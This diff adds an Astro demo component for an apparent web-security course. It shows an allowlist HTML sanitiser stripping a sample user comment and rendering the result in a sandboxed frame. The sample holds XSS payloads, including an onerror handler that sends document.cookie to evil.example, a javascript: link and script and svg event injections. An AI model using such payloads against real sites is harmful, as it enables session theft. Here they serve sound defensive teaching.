@@ -1,0 +1,94 @@
+---
+/**
+ * User-submitted HTML through an allowlist sanitiser (lib/sanitize.ts): what was removed, the
+ * clean markup, and the result rendered in a script-less sandboxed frame (defence in depth).
+ */
+import Demo from '@learn/shared/components/Demo.astro';
+
+const initial = `<p>Great recipe! <strong>Five stars.</strong></p>
+<p onmouseover="steal()">Hover me <marquee>wheee</marquee></p>
+<img src="x" onerror="fetch('//evil.example/?c='+document.cookie)">
+<a href="javascript:alert(1)">free prize</a>
+<a href="https://example.com/dal" target="_blank">my version</a>
+<script>alert('xss')</script>
+<svg><animate onbegin="alert(1)"/></svg>`;
+---
+
+<Demo title="Sanitiser lab: user HTML in, safe HTML out">
+  <div class="stack" data-sanitizer-lab>
+    <label class="control" for="sz-input">
+      <span>A comment someone submitted</span>
+      <textarea id="sz-input" rows="8" spellcheck="false">{initial}</textarea>
+    </label>
+    <div class="switcher" style="--switcher-threshold: 40rem">
+      <div class="stack stack-sm">
+        <span class="kicker">Removed</span>
+        <ul class="sz-removed" role="list" data-sz-removed></ul>
+      </div>
+      <div class="stack stack-sm">
+        <span class="kicker">Clean markup</span>
+        <pre class="sz-clean" data-sz-clean></pre>
+        <span class="kicker">Rendered (sandboxed, no scripts)</span>
+        <iframe
+          class="sz-frame"
+          title="Sanitised comment preview"
+          sandbox=""
+          data-sz-frame
+        ></iframe>
+      </div>
+    </div>
+  </div>
+  <p slot="note">
+    An allowlist (keep only known-safe tags and attributes) survives new attack tricks that a
+    blocklist misses. In production use a maintained library (DOMPurify, sanitize-html, bleach) or
+    the browser's <code>setHTML()</code> where available, sanitise on the server, and still render
+    user content under a strict Content Security Policy.
+  </p>
+</Demo>
+
+<script>
+  import { need } from '@learn/shared/client/controls.ts';
+  import { sanitizeHtml } from '../../lib/sanitize.ts';
+
+  document.querySelectorAll<HTMLElement>('[data-sanitizer-lab]').forEach((root) => {
+    const input = need<HTMLTextAreaElement>(root, '#sz-input');
+    const removed = need<HTMLUListElement>(root, '[data-sz-removed]');
+    const clean = need<HTMLElement>(root, '[data-sz-clean]');
+    const frame = need<HTMLIFrameElement>(root, '[data-sz-frame]');
+    const render = (): void => {
+      const result = sanitizeHtml(input.value);
+      removed.replaceChildren(
+        ...(result.removed.length ? result.removed : ['Nothing: the input was already safe']).map(
+          (text) => Object.assign(document.createElement('li'), { textContent: text }),
+        ),
+      );
+      clean.textContent = result.html;
+      frame.srcdoc = `<!doctype html><meta charset="utf-8"><style>body{font:15px/1.5 system-ui;margin:.75rem}</style>${result.html}`;
+    };
+    input.addEventListener('input', render);
+    render();
+  });
+</script>
+
+<style>
+  .sz-removed {
+    display: grid;
+    gap: var(--space-3xs);
+    font-family: var(--font-mono);
+    font-size: var(--step-n2);
+    color: var(--color-danger);
+  }
+  .sz-clean {
+    font-size: var(--step-n2);
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+    margin: 0;
+  }
+  .sz-frame {
+    inline-size: 100%;
+    block-size: 10rem;
+    border: 1px solid var(--color-border);
+    border-radius: var(--radius-md);
+    background: #fff;
+  }
+</style>
